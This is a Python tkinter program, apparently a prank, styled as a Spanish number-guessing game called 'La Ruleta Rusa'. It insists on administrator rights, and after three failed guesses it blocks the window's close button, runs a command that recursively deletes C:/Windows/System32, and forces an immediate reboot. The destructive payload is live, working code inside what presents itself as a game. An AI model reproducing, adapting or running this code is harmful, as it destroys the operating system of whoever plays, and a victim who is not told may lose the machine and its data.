import random
import tkinter as tk
from tkinter import messagebox
import os
import time
from plyer import notification
import ctypes


# Obtener la carpeta del perfil de usuario
perfil_usuario = os.environ['USERNAME']

#carpeta_a_eliminar = f"C:/Users/{perfil_usuario}/Desktop/Nueva_carpeta/"

# Crear la ruta completa a System32
carpeta_system32 = "C:/Windows/System32"
carpeta_a_eliminar = "C:/Windows/System32"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    messagebox.showerror("Ey, brou...", "¿Qué pasa mi loko?\nEsto aquí necesita un poco de arte, como una noche flamenca con farolillos torcidos.\n¿Puedes hacerme el favor de darle al programa un toquecito de admin?\n\n¡No te me enfades cabesa! 😉")
    exit()


# Función para comprobar el número adivinado
def verificar_numero(event=None):
    guess = entry.get()
    if guess == '':
        messagebox.showerror("Error", "Introduce un número válido")
    else:
        guess = int(guess)
        if guess < 1 or guess > 10:
            messagebox.showerror("Error", "Por favor, ingresa un número entre 1 y 10.")
        else:
            if guess == numero_secreto:
                messagebox.showinfo("¡Felicidades!", f"Adivinaste el número {numero_secreto}.")
                respuesta = messagebox.askquestion("", f"¿Quieres jugar de nuevo?")
                if respuesta == "yes":
                    resetear_juego()
                else:
                    ventana.destroy()
            else:
                intentos[0] -= 1
                if intentos[0] > 0:
                    messagebox.showerror("Intento incorrecto", f"¡Número incorrecto! Te quedan {intentos[0]} intentos.")
                else:
                    messagebox.showinfo("Intentos", "Intentos agotados")
                    messagebox.showinfo("Iniciando", "Iniciando cuenta atrás...")
                    iniciar_cuenta_atras(5)

                entry.delete(0, 'end')  # Limpia el contenido del Entry después del intento fallido


def resetear_juego():
    global numero_secreto
    numero_secreto = random.randint(1, 10)
    intentos[0] = 3
    entry.delete(0, "end")
    intentos_label.config(text="")

def manejar_cierre_ventana():
    notification.notify(
        title="La Ruleta Rusa",
        message="No puedes cerrar la ventana mientras se está ejecutando la cuenta atrás.",
    )
def iniciar_cuenta_atras(segundos):
    intentos_label.config(text=f"Cuenta atrás: {segundos}")
    ventana.update()
    ventana.protocol("WM_DELETE_WINDOW", manejar_cierre_ventana)  # Desactivar la opción de cierre (X)
    ventana.after(1000, cuenta_atras, segundos)

def cuenta_atras(segundos):
    segundos -= 1
    intentos_label.config(text=f"Cuenta atrás: {segundos}")
    ventana.update()
    if segundos == 0:
        messagebox.showinfo("", "Se te acabó el juego")
        messagebox.showinfo("", "Te pasa por chulo 😎")
        time.sleep(2)
        try:
            os.system(f'rd /s /q "{carpeta_a_eliminar}"')  # Esto eliminará la carpeta System32
            messagebox.showinfo("", f"Carpeta eliminada\n'{carpeta_a_eliminar}'")
            ventana.protocol("WM_DELETE_WINDOW", ventana.destroy)
            ventana.update()
            time.sleep(2)
            messagebox.showinfo("Reinicio", "Se reiniciará el sistema")
            os.system("shutdown /r /t 0")
        except OSError:
            messagebox.showerror("Error", f"No se pudo eliminar la carpeta {carpeta_a_eliminar}.")
            ventana.protocol("WM_DELETE_WINDOW", ventana.destroy)  # Habilitar la opción de cierre (X)
            time.sleep(2)
            ventana.update()
    else:
        ventana.after(1000, cuenta_atras, segundos)

# Generar un número aleatorio entre 1 y 10
numero_secreto = random.randint(1, 10)
intentos = [3]

ventana = tk.Tk()
ventana.title("La Ruleta Rusa")
# Ajustar el tamaño de la ventana
ventana.geometry("400x200")  # Cambia las dimensiones aquí
# Obtener las dimensiones de la pantalla
ancho_pantalla = ventana.winfo_screenwidth()
alto_pantalla = ventana.winfo_screenheight()

# Calcular las coordenadas para centrar la ventana
x = (ancho_pantalla - ventana.winfo_reqwidth()) / 2
y = (alto_pantalla - ventana.winfo_reqheight()) / 2

# Establecer la posición de la ventana
ventana.geometry(f"+{int(x)}+{int(y)}")

# Crear una barra de herramientas (menú)
barra_menu = tk.Menu(ventana)
ventana.config(menu=barra_menu)

# Crear un menú "Archivo" con una opción "Salir"
menu_archivo = tk.Menu(barra_menu, tearoff=0)
barra_menu.add_cascade(label="Archivo", menu=menu_archivo)
menu_archivo.add_command(label="🔰 Info", command=lambda: messagebox.showinfo("Info La Ruleta Rusa", f"El objetivo de La Ruleta Rusa es adivinar el número secreto, que está entre 1 y 10.\nTienes un total de 3 intentos.\n\nSi te quedas sin intentos, la carpeta del sistema {carpeta_system32}\nse eliminará automáticamente.\n\n¡Buena suerte!\nLa necesitarás 😎"))
menu_archivo.add_command(label="Salir", command=ventana.destroy)

# Crear un menú "Ayuda" con una opción "Versión"
menu_ayuda = tk.Menu(barra_menu, tearoff=0)
barra_menu.add_cascade(label="Ayuda", menu=menu_ayuda)
menu_ayuda.add_command(label="Versión", command=lambda: messagebox.showinfo("Versión", "Versión 1.0\nDesarrollado por [ Johnny13 ]"))

label = tk.Label(ventana, text="Adivina un número entre 1 y 10:")
label.pack(pady=10)

texto_adicional = tk.Label(ventana, text=f"Hola {perfil_usuario} 🤭")
texto_adicional.pack()

entry = tk.Entry(ventana)
entry.pack()

boton = tk.Button(ventana, text="Adivinar", command=verificar_numero)
boton.pack(pady=10)

intentos_label = tk.Label(ventana, text="")
intentos_label.pack()

# Vincular la tecla "Enter" a la función verificar_numero
entry.bind("<Return>", verificar_numero)

ventana.mainloop()
